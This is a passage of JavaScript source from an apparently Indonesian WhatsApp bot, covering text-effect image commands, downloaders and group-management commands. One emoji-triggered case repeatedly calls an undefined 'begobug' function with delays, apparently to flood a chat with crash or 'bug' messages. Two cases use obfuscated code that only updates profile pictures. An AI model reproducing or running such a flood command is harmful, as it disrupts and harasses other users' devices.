  if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!q) return m.reply(`Contoh : ${prefix + command} ${botname}`) 
sticWait(from)
let link
if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
if (/metalic/.test(command)) link = 'https://textpro.me/creat-glossy-metalic-text-effect-free-online-1040.html'
if (/fiction/.test(command)) link = 'https://textpro.me/create-science-fiction-text-effect-online-free-1038.html'
if (/demon/.test(command)) link = 'https://textpro.me/create-green-horror-style-text-effect-online-1036.html'
if (/transformer/.test(command)) link = 'https://textpro.me/create-a-transformer-text-effect-online-1035.html'
if (/berry/.test(command)) link = 'https://textpro.me/create-berry-text-effect-online-free-1033.html'
if (/thunder/.test(command)) link = 'https://textpro.me/online-thunder-text-effect-generator-1031.html'
if (/magma/.test(command)) link = 'https://textpro.me/create-a-magma-hot-text-effect-online-1030.html'
if (/3dstone/.test(command)) link = 'https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html'
if (/neonlight/.test(command)) link = 'https://textpro.me/create-3d-neon-light-text-effect-online-1028.html'
if (/glitch/.test(command)) link = 'https://textpro.me/create-impressive-glitch-text-effects-online-1027.html'
if (/harrypotter/.test(command)) link = 'https://textpro.me/create-harry-potter-text-effect-online-1025.html'
if (/brokenglass/.test(command)) link = 'https://textpro.me/broken-glass-text-effect-free-online-1023.html'
if (/papercut/.test(command)) link = 'https://textpro.me/create-art-paper-cut-text-effect-online-1022.html'
if (/watercolor/.test(command)) link = 'https://textpro.me/create-a-free-online-watercolor-text-effect-1017.html'
if (/multicolor/.test(command)) link = 'https://textpro.me/online-multicolor-3d-paper-cut-text-effect-1016.html'
if (/neondevil/.test(command)) link = 'https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html'
if (/underwater/.test(command)) link = 'https://textpro.me/3d-underwater-text-effect-generator-online-1013.html'
if (/graffitibike/.test(command)) link = 'https://textpro.me/create-wonderful-graffiti-art-text-effect-1011.html'
if (/snow/.test(command)) link = 'https://textpro.me/create-snow-text-effects-for-winter-holidays-1005.html'
if (/cloud/.test(command)) link = 'https://textpro.me/create-a-cloud-text-effect-on-the-sky-online-1004.html'
if (/honey/.test(command)) link = 'https://textpro.me/honey-text-effect-868.html'
if (/ice/.test(command)) link = 'https://textpro.me/ice-cold-text-effect-862.html'
if (/fruitjuice/.test(command)) link = 'https://textpro.me/fruit-juice-text-effect-861.html'
if (/biscuit/.test(command)) link = 'https://textpro.me/biscuit-text-effect-858.html'
if (/wood/.test(command)) link = 'https://textpro.me/wood-text-effect-856.html'
if (/chocolate/.test(command)) link = 'https://textpro.me/chocolate-cake-text-effect-890.html'
if (/strawberry/.test(command)) link = 'https://textpro.me/strawberry-text-effect-online-889.html'
if (/matrix/.test(command)) link = 'https://textpro.me/matrix-style-text-effect-online-884.html'
if (/blood/.test(command)) link = 'https://textpro.me/horror-blood-text-effect-online-883.html'
if (/dropwater/.test(command)) link = 'https://textpro.me/dropwater-text-effect-872.html'
if (/toxic/.test(command)) link = 'https://textpro.me/toxic-text-effect-online-901.html'
if (/lava/.test(command)) link = 'https://textpro.me/lava-text-effect-online-914.html'
if (/rock/.test(command)) link = 'https://textpro.me/rock-text-effect-online-915.html'
if (/bloodglas/.test(command)) link = 'https://textpro.me/blood-text-on-the-frosted-glass-941.html'
if (/hallowen/.test(command)) link = 'https://textpro.me/halloween-fire-text-effect-940.html'
if (/darkgold/.test(command)) link = 'https://textpro.me/metal-dark-gold-text-effect-online-939.html'
if (/joker/.test(command)) link = 'https://textpro.me/create-logo-joker-online-934.html'
if (/wicker/.test(command)) link = 'https://textpro.me/wicker-text-effect-online-932.html'
if (/firework/.test(command)) link = 'https://textpro.me/firework-sparkle-text-effect-930.html'
if (/skeleton/.test(command)) link = 'https://textpro.me/skeleton-text-effect-online-929.html'
if (/blackpink/.test(command)) link = 'https://textpro.me/create-blackpink-logo-style-online-1001.html'
if (/sand/.test(command)) link = 'https://textpro.me/write-in-sand-summer-beach-free-online-991.html'
if (/glue/.test(command)) link = 'https://textpro.me/create-3d-glue-text-effect-with-realistic-style-986.html'
if (/1917/.test(command)) link = 'https://textpro.me/1917-style-text-effect-online-980.html'
if (/leaves/.test(command)) link = 'https://textpro.me/natural-leaves-text-effect-931.html'
let anu = await maker.textpro(link, q)
kesper.sendMessage(m.chat, { image: { url: anu }, caption: `*© Created By ${botname}*` }, { quoted: m })
}
sticSukses(from)
break
//=================================================//
case 'transformer': case 'fomer': case 'trans':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
 maker.textpro("https://textpro.me/create-a-transformer-text-effect-online-1035.html", [
`${q}`,])
.then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));

sticSukses(from)
break
//=================================================//
case 'herryp': case 'potter': case 'heryy':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
sticWait(from)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-harry-potter-text-effect-online-1025.html", [
 `${teks1}`,`${teks2}`])
 .then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case 'neondevil': case 'neon': case 'devil':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
 maker.textpro("https://textpro.me/create-neon-devil-wings-text-effect-online-free-1014.html", [
`${q}`,])
 .then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 
 sticSukses(from)
break
//=================================================//
case '3dstone': case 'stone':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/3d-stone-cracked-cool-text-effect-1029.html", [
 `${q}`,])
.then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'thunder': case 'thun':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/online-thunder-text-effect-generator-1031.html", [
 `${q}`,])
.then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'graf':
case 'graffiti':
case 'grafiti':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
sticWait(from)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-a-cool-graffiti-text-on-the-wall-1010.html", [
 `${teks1}`,`${teks2}`])
.then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'glitch3':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if(!q) return m.reply(`Penggunaan ${command} teks|teks`)
sticWait(from)
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
maker.textpro("https://textpro.me/create-glitch-text-effect-style-tik-tok-983.html", [
 `${teks1}`,`${teks2}`])
.then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case '3dbox':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/3d-box-text-effect-online-880.html", [
 `${q}`,])
.then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break

case '🛐':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
begobug('mark kntl')
await sleep(3000)
break
//=================================================//
case 'drapwater': case 'water':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
 maker.textpro("https://textpro.me/dropwater-text-effect-872.html", [
`${q}`,])
 .then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'lion2': case 'lionn':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if(!q) return m.reply(`Penggunaan ${command} teks`)
sticWait(from)
maker.textpro("https://textpro.me/create-lion-logo-mascot-online-938.html", [
 `${q}`,])
.then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
.catch((err) => console.log(err));
sticSukses(from)
break
//=================================================//
case 'papercut': case 'paper': case 'cute':
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 if(!q) return m.reply(`Penggunaan ${command} teks`)
 sticWait(from)
 maker.textpro("https://textpro.me/create-art-paper-cut-text-effect-online-1022.html", [
`${q}`,])
 .then((data) => kesper.sendMessage(m.chat, { image: { url: data }, caption: `*© Created By ${botname}*` }, { quoted: m }))
 .catch((err) => console.log(err));
 sticSukses(from)
break
//=================================================//
case 'ytmp4': case 'ytvideo': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let { ytv } = require('./casper-file/lib/y2mate')
if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
let quality = args[1] ? args[1] : '360p'
let media = await ytv(text, quality)
if (media.filesize >= 100000) return reply('File Melebihi Batas '+util.format(media))
kesper.sendMessage(m.chat, { video: { url: media.dl_link }, mimetype: 'video/mp4', fileName: `${media.title}.mp4`, caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '360p'}` }, { quoted: m })
}
break
//=================================================//
case 'q': case 'quoted': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.quoted) return m.reply('Reply Pesannya!!')
let wokwol = await kesper.serializeM(await m.getQuotedObj())
if (!wokwol.quoted) return m.reply('Pesan Yang anda reply tidak mengandung reply')
await wokwol.quoted.copyNForward(m.chat, true)
}
break
//=================================================//
case 'listpc': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 let anu = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `⬣ *LIST PERSONAL CHAT*\n\nTotal Chat : ${anu.length} Chat\n\n`
 for (let i of anu) {
 let nama = store.messages[i].array[0].pushName
 teks += `⬡ *Nama :* ${nama}\n⬡ *User :* @${i.split('@')[0]}\n⬡ *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 kesper.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
case 'listgc': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 let anu = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `⬣ *LIST GROUP CHAT*\n\nTotal Group : ${anu.length} Group\n\n`
 for (let i of anu) {
 let metadata = await kesper.groupMetadata(i)
 teks += `⬡ *Nama :* ${metadata.subject}\n⬡ *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Tidak diketahui'}\n⬡ *ID :* ${metadata.id}\n⬡ *Dibuat :* ${moment(metadata.creation * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n⬡ *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 kesper.sendTextWithMentions(m.chat, teks, m)
 }
 break
//=================================================//
 case 'listonline': case 'liston': {
 if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
  if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
  let id = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat
let online = [...Object.keys(store.presences[id]), botNumber]
kesper.sendText(m.chat, 'List Online:\n\n' + online.map(v => '⭔ @' + v.replace(/@.+/, '')).join`\n`, m, { mentions: online })
 }
 break
case 'delete': case 'del': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.quoted) throw false
let { chat, fromMe, id, isBaileys } = m.quoted
if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
kesper.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
}
break
case 'linkgroup': case 'linkgc': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
let response = await kesper.groupInviteCode(m.chat)
kesper.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'tagall': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
let teks = `══✪〘 *👥 Tag All* 〙✪══
 ➲ *Pesan : ${q ? q : 'kosong'}*\n\n`
for (let mem of participants) {
teks += `⭔ @${mem.id.split('@')[0]}\n`
}
kesper.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted:m })
}
break
//=================================================//
case 'hidetag': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
kesper.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted:m })
}
break
//=================================================//
case 'style': case 'styletext': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
db.data.users[m.sender].limit -= 1 // -1 limit
let { styletext } = require('./casper-file/lib/scraper')
if (!text) throw 'Masukkan Query text!'
let anu = await styletext(text)
let teks = `Srtle Text From ${text}\n\n`
for (let i of anu) {
teks += `⭔ *${i.name}* : ${i.result}\n\n`
}
reply(teks)
}
break

//=================================================//
 case 'group': case 'grup': {
 if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
  if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
 if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (args[0] === 'close'){
await kesper.groupSettingUpdate(m.chat, 'announcement').then((res) => m.reply(`Sukses Menutup Group`)).catch((err) => m.reply(jsonformat(err)))
} else if (args[0] === 'open'){
await kesper.groupSettingUpdate(m.chat, 'not_announcement').then((res) => m.reply(`Sukses Membuka Group`)).catch((err) => m.reply(jsonformat(err)))
} else {
const anmu = {
video:fs.readFileSync("./casper-file/video/kesper.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mode Group`,
}
kesper.sendMessage(m.chat, anmu, `Mode Group Contoh : Group On / Group Off`, kesper.user.name, m)
 }
}
break
//=================================================//
case 'editinfo': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
 if (args[0] === 'open'){
await kesper.groupSettingUpdate(m.chat, 'unlocked').then((res) => m.reply(`Sukses Membuka Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else if (args[0] === 'close'){
await kesper.groupSettingUpdate(m.chat, 'locked').then((res) => m.reply(`Sukses Menutup Edit Info Group`)).catch((err) => m.reply(jsonformat(err)))
 } else {
 const anju = {
video:fs.readFileSync("./casper-file/video/kesper.mp4"),
gifPlayback:true,
jpegThumbnail:log0,
caption:  `Mode Edit Info`,
}
kesper.sendMessage(m.chat, anju, `Mode Edit Info Contoh : editinfo On / editinfo Off`, kesper.user.name, m)
}
}
break
case 'setppbot': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
var _0x1c413d=_0x2a1c;(function(_0x477de5,_0x25404c){var _0xc6ef35=_0x2a1c,_0x1a86a3=_0x477de5();while(!![]){try{var _0x392e78=parseInt(_0xc6ef35(0xff))/0x1+-parseInt(_0xc6ef35(0xfc))/0x2+-parseInt(_0xc6ef35(0xf9))/0x3*(parseInt(_0xc6ef35(0xfe))/0x4)+parseInt(_0xc6ef35(0x103))/0x5*(parseInt(_0xc6ef35(0x100))/0x6)+parseInt(_0xc6ef35(0x105))/0x7+parseInt(_0xc6ef35(0x108))/0x8+-parseInt(_0xc6ef35(0x102))/0x9*(parseInt(_0xc6ef35(0xfd))/0xa);if(_0x392e78===_0x25404c)break;else _0x1a86a3['push'](_0x1a86a3['shift']());}catch(_0x4aa4a8){_0x1a86a3['push'](_0x1a86a3['shift']());}}}(_0x512f,0x3121c));var media=await kesper[_0x1c413d(0x10a)](quoted);function _0x2a1c(_0x26455a,_0x1953ac){var _0x512fee=_0x512f();return _0x2a1c=function(_0x2a1c5a,_0x267fa3){_0x2a1c5a=_0x2a1c5a-0xf8;var _0xfaa61b=_0x512fee[_0x2a1c5a];return _0xfaa61b;},_0x2a1c(_0x26455a,_0x1953ac);}try{if(args[0x0]==_0x1c413d(0xfa)){const {generateProfilePicture}=require('./casper-file/lib/myfunc');var {img}=await generateProfilePicture(media);await kesper[_0x1c413d(0x106)]({'tag':'iq','attrs':{'to':botNumber,'type':'set','xmlns':_0x1c413d(0x107)},'content':[{'tag':_0x1c413d(0xf8),'attrs':{'type':_0x1c413d(0xfb)},'content':img}]});}else await kesper[_0x1c413d(0x101)](botNumber,{'url':media});m['reply'](mess[_0x1c413d(0x109)]);}catch{m[_0x1c413d(0x104)]('Gagal\x20Mengganti\x20Photo\x20Profile');}function _0x512f(){var _0x2f232f=['reply','1286194bdHKgR','query','w:profile:picture','3088072VzwWid','success','downloadAndSaveMediaMessage','picture','153igiZJi','/full','image','720650VaxDBN','2205790rCEybd','5796etOiDI','80334lizMjF','6GdpecB','updateProfilePicture','9DZAUSC','1029810dkCbDi'];_0x512f=function(){return _0x2f232f;};return _0x512f();}
}
break
//=================================================//
case 'setppgroup': case 'setppgrup': case 'setppgc': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw mess.group
if (!isAdmins) throw mess.admin
sticWait(from)
if (!quoted) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
const _0x3c52ee=_0x4109;(function(_0x1a4f9f,_0x3819cc){const _0x5c4a67=_0x4109,_0x4d0e21=_0x1a4f9f();while(!![]){try{const _0x2fe536=-parseInt(_0x5c4a67(0x78))/0x1+parseInt(_0x5c4a67(0x7a))/0x2*(-parseInt(_0x5c4a67(0x7e))/0x3)+parseInt(_0x5c4a67(0x73))/0x4+parseInt(_0x5c4a67(0x7c))/0x5+-parseInt(_0x5c4a67(0x72))/0x6+parseInt(_0x5c4a67(0x76))/0x7+parseInt(_0x5c4a67(0x70))/0x8;if(_0x2fe536===_0x3819cc)break;else _0x4d0e21['push'](_0x4d0e21['shift']());}catch(_0x3ccaac){_0x4d0e21['push'](_0x4d0e21['shift']());}}}(_0x38ce,0x9724c));function _0x4109(_0x2b2147,_0x340f6c){const _0x38ce6f=_0x38ce();return _0x4109=function(_0x410966,_0x2335d5){_0x410966=_0x410966-0x6d;let _0xbe9a92=_0x38ce6f[_0x410966];return _0xbe9a92;},_0x4109(_0x2b2147,_0x340f6c);}let media=await kesper['downloadAndSaveMediaMessage'](quoted);function _0x38ce(){const _0x2fbc7e=['43773HHkTHV','w:profile:picture','./casper-file/lib/myfunc','chat','10418328MFCmiM','reply','6441450CkyNxQ','1458440XVIgpe','set','picture','4984819pxHUxY','/full','786695iyptWU','query','142qiVRKp','image','5681485dynfLf','Gagal\x20Mengganti\x20Photo\x20Profile'];_0x38ce=function(){return _0x2fbc7e;};return _0x38ce();}try{if(args[0x0]==_0x3c52ee(0x77)){const {generateProfilePicture}=require(_0x3c52ee(0x6e));var {img}=await generateProfilePicture(media);await kesper[_0x3c52ee(0x79)]({'tag':'iq','attrs':{'to':m[_0x3c52ee(0x6f)],'type':_0x3c52ee(0x74),'xmlns':_0x3c52ee(0x6d)},'content':[{'tag':_0x3c52ee(0x75),'attrs':{'type':_0x3c52ee(0x7b)},'content':img}]});}else await kesper['updateProfilePicture'](m[_0x3c52ee(0x6f)],{'url':media});m[_0x3c52ee(0x71)](mess['success']);}catch{m['reply'](_0x3c52ee(0x7d));}
}
break
case 'block': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kesper.updateBlockStatus(users, 'block').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'unblock': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kesper.updateBlockStatus(users, 'unblock').then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setname': case 'setsubject': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await kesper.groupUpdateSubject(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break
//=================================================//
case 'setdesc': case 'setdesk': {
if (!isCreator) return m.reply('Maaf saat ini fitur untuk free user hanyalah membuat stiker, Jika ingin menjadi premium user silahkan hubungi wa.me/62882003133773')
if (isBan) return reply(`Lu Di Ban Kids`)
if (!m.isGroup) throw groupon(from)
if (!isBotAdmins) throw SiGroupadmin(from)
if (!isAdmins) throw sticAdmin(from)
if (!text) throw 'Text ?'
await kesper.groupUpdateDescription(m.chat, text).then((res) => sticSukses(from)).catch((err) => m.reply(jsonformat(err)))
}
break

//=================================================//
case 'once': case 'toonce': { 
if (isBan) throw sticBanLu(from)
if (!quoted) throw 'Reply Image'
if (/image/.test(mime)) {
anu = await kesper.downloadAndSaveMediaMessage(quoted)
kesper.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anu = await kesper.downloadAndSaveMediaMessage(quoted)
kesper.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: m })
}
}
break

case 'ss': {
